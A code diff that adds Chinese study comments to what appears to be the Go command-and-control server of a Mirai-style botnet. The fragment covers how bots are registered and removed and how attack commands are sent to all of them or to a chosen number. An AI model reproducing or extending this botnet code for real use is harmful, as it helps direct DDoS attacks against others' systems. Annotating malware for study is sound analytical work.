@@ -19,7 +19,7 @@ type AttackSend struct {
 type ClientList struct {
     uid         int
     count       int
-    clients     map[int]*Bot
+    clients     map[int]*Bot  //所有的bots
     addQueue    chan *Bot
     delQueue    chan *Bot
     atkQueue    chan *AttackSend  //攻击数据的队列
@@ -61,6 +61,8 @@ func (this *ClientList) DelClient(c *Bot) {
     fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
 }
 
+
+//第一个参数是build函数构造的私有网络协议数据，最后发送的也是这个buf
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
     attack := &AttackSend{buf, maxbots, botCata}
     this.atkQueue <- attack
@@ -84,27 +86,27 @@ func (this *ClientList) worker() {  //ClientList 的worker方法
 
     for {
         select {
-        case add := <-this.addQueue:
+        case add := <-this.addQueue:  //添加bot节点
             this.totalCount <- 1
             this.uid++
             add.uid = this.uid
             this.clients[add.uid] = add
             break
-        case del := <-this.delQueue:
+        case del := <-this.delQueue:  //删除bot节点
             this.totalCount <- -1
             delete(this.clients, del.uid)
             break
         case atk := <-this.atkQueue:
-            if atk.count == -1 {
-                for _,v := range this.clients {
+            if atk.count == -1 {   //-1是啥
+                for _,v := range this.clients {//给所有clients发送攻击命令
                     if atk.botCata == "" || atk.botCata == v.source {
-                        v.QueueBuf(atk.buf)
+                        v.QueueBuf(atk.buf)  //QueueBuf是bot.go里面的函数，即write
                     }
                 }
             } else {
                 var count int
                 for _, v := range this.clients {
-                    if count > atk.count {
+                    if count > atk.count { //只给atk.count个bot发送攻击命令
                         break
                     }
                     if atk.botCata == "" || atk.botCata == v.source {
